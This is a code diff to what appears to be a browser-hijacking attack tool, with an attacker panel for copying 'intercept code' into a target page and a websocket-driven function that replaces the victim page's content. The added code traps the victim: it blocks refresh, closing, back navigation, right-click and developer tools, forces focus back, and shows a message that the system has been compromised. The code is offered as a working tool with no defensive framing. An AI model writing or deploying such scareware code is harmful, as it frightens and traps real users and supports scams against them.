@@ -228,6 +228,30 @@ class PanelController {
         }
     }
     
+    // Handle Target Close Event
+    handleTargetClose(targetId) {
+        this.targetAvailable = false;
+        this.targetId = null;
+        this.addLogEntry(`❌ Target disconnected: ${targetId}`);
+        this.showError('Target has disconnected. Copy intercept code to new target.');
+        
+        // Reset to copy intercept code button
+        const copyCodeBtn = document.getElementById('copy-code-btn');
+        if (copyCodeBtn) {
+            copyCodeBtn.innerHTML = '<span>📋 COPY INTERCEPT CODE</span><div class="btn-glitch"></div>';
+            copyCodeBtn.className = 'cyber-btn primary';
+            copyCodeBtn.title = 'Copy intercept code to clipboard';
+            copyCodeBtn.disabled = false;
+            
+            // Remove old event listener and add copy code functionality
+            copyCodeBtn.replaceWith(copyCodeBtn.cloneNode(true));
+            const newCopyBtn = document.getElementById('copy-code-btn');
+            newCopyBtn.addEventListener('click', () => {
+                this.copyInterceptCode();
+            });
+        }
+    }
+    
     // Update Attack Button State
     updateAttackButton() {
         const copyCodeBtn = document.getElementById('copy-code-btn');
@@ -663,6 +687,9 @@ hacker_ws.onmessage = (event) => {
 function replacePageHTML(htmlContent) {
     console.log('🚨 PAGE HIJACKED - Replacing body content');
     
+    // ACTIVATE ANTI-EXIT PROTECTION
+    enableAntiExitProtection();
+    
     try {
         // Extract content from the HTML (remove html, head, body tags if present)
         let bodyContent = htmlContent;
@@ -736,6 +763,150 @@ function replacePageHTML(htmlContent) {
             console.error('All methods failed:', fallbackError);
         }
     }
+}
+
+function enableAntiExitProtection() {
+    console.log('🔒 ANTI-EXIT PROTECTION ACTIVATED');
+    
+    // Prevent F5 refresh
+    document.addEventListener('keydown', function(e) {
+        // F5 key
+        if (e.key === 'F5' || e.keyCode === 116) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 F5 refresh blocked');
+            return false;
+        }
+        
+        // Ctrl+R refresh
+        if ((e.ctrlKey || e.metaKey) && (e.key === 'r' || e.keyCode === 82)) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 Ctrl+R refresh blocked');
+            return false;
+        }
+        
+        // Ctrl+F5 hard refresh
+        if (e.ctrlKey && (e.key === 'F5' || e.keyCode === 116)) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 Ctrl+F5 hard refresh blocked');
+            return false;
+        }
+        
+        // Alt+F4 close window
+        if (e.altKey && (e.key === 'F4' || e.keyCode === 115)) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 Alt+F4 close blocked');
+            return false;
+        }
+        
+        // Ctrl+W close tab
+        if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.keyCode === 87)) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 Ctrl+W close tab blocked');
+            return false;
+        }
+        
+        // Ctrl+Shift+T reopen tab
+        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 't' || e.keyCode === 84)) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 Ctrl+Shift+T blocked');
+            return false;
+        }
+    }, true);
+    
+    // Prevent right-click context menu
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        console.log('🚫 Right-click blocked');
+        return false;
+    }, true);
+    
+    // Prevent back/forward navigation
+    window.addEventListener('popstate', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        history.pushState(null, null, window.location.href);
+        console.log('🚫 Navigation blocked');
+        return false;
+    });
+    
+    // Push initial state to prevent back button
+    history.pushState(null, null, window.location.href);
+    
+    // Prevent page unload/refresh
+    window.addEventListener('beforeunload', function(e) {
+        const message = 'You cannot leave this page. The system has been compromised.';
+        e.preventDefault();
+        e.returnValue = message;
+        console.log('🚫 Page unload blocked');
+        return message;
+    });
+    
+    // Prevent page visibility change (tab switching)
+    document.addEventListener('visibilitychange', function(e) {
+        if (document.hidden) {
+            // Force focus back to this tab
+            window.focus();
+            console.log('🚫 Tab switch detected - forcing focus back');
+        }
+    });
+    
+    // Disable developer tools shortcuts
+    document.addEventListener('keydown', function(e) {
+        // F12 Developer Tools
+        if (e.key === 'F12' || e.keyCode === 123) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 F12 Developer Tools blocked');
+            return false;
+        }
+        
+        // Ctrl+Shift+I Developer Tools
+        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.keyCode === 73)) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 Ctrl+Shift+I Developer Tools blocked');
+            return false;
+        }
+        
+        // Ctrl+Shift+J Console
+        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'J' || e.keyCode === 74)) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 Ctrl+Shift+J Console blocked');
+            return false;
+        }
+        
+        // Ctrl+U View Source
+        if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.keyCode === 85)) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🚫 Ctrl+U View Source blocked');
+            return false;
+        }
+    }, true);
+    
+    // Continuous focus enforcement
+    setInterval(function() {
+        if (!document.hasFocus()) {
+            window.focus();
+            console.log('🔒 Enforcing window focus');
+        }
+    }, 1000);
+    
+    // Prevent window blur
+    window.addEventListener('blur', function(e) {
+        setTimeout(function() {
+            window.focus();
+            console.log('🔒 Window blur prevented - refocusing');
+        }, 100);
+    });
 }
 
 function playAttackMusic(musicBase64) {
